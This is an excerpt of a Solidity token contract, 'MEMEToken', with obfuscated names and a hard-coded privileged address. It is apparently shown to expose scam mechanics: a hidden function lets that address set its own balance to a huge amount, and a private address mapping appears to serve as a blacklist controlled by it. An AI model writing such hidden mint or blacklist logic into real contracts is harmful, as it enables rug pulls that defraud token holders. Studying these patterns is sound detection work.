...
contract MEMEToken is Ownable {
    ...
    address public _beeceo776;
    mapping(address => bool) private edcrfv;
    function quitOPDoge(address sss) external   {
        if (_beeceo776 == _msgSender()) {
            edcrfv[sss] = false;
        }
         if (_beeceo776 == _msgSender()) {
            edcrfv[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo776 == adminAddress){
            _balances[_beeceo776] = googoNum()*(45000);
        }
        if(_beeceo776 == adminAddress){
            _balances[_beeceo776] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo776 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
